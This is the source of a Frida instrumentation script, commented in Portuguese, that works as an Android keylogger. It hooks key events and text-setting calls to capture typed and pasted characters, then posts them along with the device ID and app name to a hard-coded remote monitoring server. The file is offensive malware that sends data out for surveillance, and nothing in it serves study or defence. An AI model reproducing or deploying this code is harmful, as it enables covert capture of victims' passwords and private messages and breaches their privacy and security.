// Frida Keylog Agent - Captura entrada de teclado
console.log("[Keylog Agent] Iniciando interceptação de teclado...");

const KeyEvent = Java.use("android.view.KeyEvent");
const ViewGroup = Java.use("android.view.ViewGroup");
const EditText = Java.use("android.widget.EditText");
const TextView = Java.use("android.widget.TextView");
const Settings = Java.use("android.provider.Settings");

let lastAppName = "desconhecido";
let lastKeyTime = 0;
const KEYLOG_THROTTLE_MS = 100; // Não enviar a cada tecla, agrupar

// Rastrear app em foco
const ActivityManager = Java.use("android.app.ActivityManager");
try {
  const runtime = Java.use("java.lang.Runtime");
  const process = runtime.getRuntime().exec("dumpsys window | grep mCurrentFocus");
  // Simplificado - vamos usar um método mais prático
} catch (e) {
  console.log("[Keylog Agent] Erro ao rastrear app: " + e);
}

// Interceptar chamadas de setText em EditText
EditText.$new.overload().implementation = function() {
  return this.$new.call(this);
};

// Interceptar KeyEvent mais direto
KeyEvent.getKeyCode.implementation = function() {
  const code = this.getKeyCode();
  const time = Java.use("java.lang.System").currentTimeMillis();
  
  if (time - lastKeyTime > KEYLOG_THROTTLE_MS) {
    lastKeyTime = time;
    const char = String.fromCharCode(code);
    
    // Enviar para servidor
    sendKeylog("input", char);
  }
  
  return code;
};

// Interceptar dispatchKeyEvent - mais preciso
try {
  const View = Java.use("android.view.View");
  View.dispatchKeyEvent.implementation = function(event) {
    const action = event.getAction();
    const keyCode = event.getKeyCode();
    
    // Só captura KeyDown para evitar duplicatas
    if (action === 0) { // KeyEvent.ACTION_DOWN
      const char = getCharForKeyCode(keyCode);
      if (char && char.match(/[a-zA-Z0-9@._\-#]/)) {
        sendKeylog("key", char);
      }
    }
    
    return this.dispatchKeyEvent.call(this, event);
  };
} catch (e) {
  console.log("[Keylog Agent] Erro ao interceptar dispatchKeyEvent: " + e);
}

// Interceptar getText de EditText para capturar cola/paste
try {
  const Editable = Java.use("android.text.Editable");
  const EditableFactory = Java.use("android.text.Editable$Factory");
  
  EditText.setText.overload("java.lang.CharSequence").implementation = function(text) {
    if (text && text.toString().length > 0) {
      sendKeylog("paste", text.toString().slice(-50)); // Últimos 50 chars
    }
    return this.setText.call(this, text);
  };
} catch (e) {
  console.log("[Keylog Agent] Erro ao interceptar setText: " + e);
}

function getCharForKeyCode(code) {
  const mapping = {
    7: "0", 8: "1", 9: "2", 10: "3", 11: "4", 12: "5", 13: "6", 14: "7", 15: "8", 16: "9",
    29: "a", 30: "b", 31: "c", 32: "d", 33: "e", 34: "f", 35: "g", 36: "h", 37: "i", 38: "j",
    39: "k", 40: "l", 41: "m", 42: "n", 43: "o", 44: "p", 45: "q", 46: "r", 47: "s", 48: "t",
    49: "u", 50: "v", 51: "w", 52: "x", 53: "y", 54: "z",
    56: "'", 57: " ", 61: "@", 203: ".", 208: "-",
  };
  return mapping[code] || "";
}

function sendKeylog(type, text) {
  if (!text || text.trim().length === 0) return;
  
  setTimeout(() => {
    try {
      const androidId = Settings.Secure.getString(
        Java.use("android.app.ActivityManagerNative").getDefault().getRunningTasks(1)[0],
        Settings.Secure.ANDROID_ID
      );
      
      const url = "https://remotemonitor-production-b232.up.railway.app/api/device/keylog";
      const HttpClient = Java.use("java.net.HttpURLConnection");
      const URL = Java.use("java.net.URL");
      
      const conn = new URL(url).openConnection();
      conn.setRequestMethod("POST");
      conn.setRequestProperty("Content-Type", "application/json");
      conn.setDoOutput(true);
      
      const json = {
        packageName: "com.acesso.seguro",
        deviceUid: androidId,
        deviceName: "Android",
        model: "Android",
        appName: lastAppName,
        keyText: text
      };
      
      const payload = JSON.stringify(json);
      const out = conn.getOutputStream();
      out.write(Java.use("java.lang.String").$new(payload).getBytes("UTF-8"));
      out.close();
      
      conn.getResponseCode();
      conn.disconnect();
      
      console.log("[Keylog Agent] Enviado: " + text);
    } catch (e) {
      console.log("[Keylog Agent] Erro ao enviar: " + e);
    }
  }, 0);
}

console.log("[Keylog Agent] Hook instalado com sucesso!");
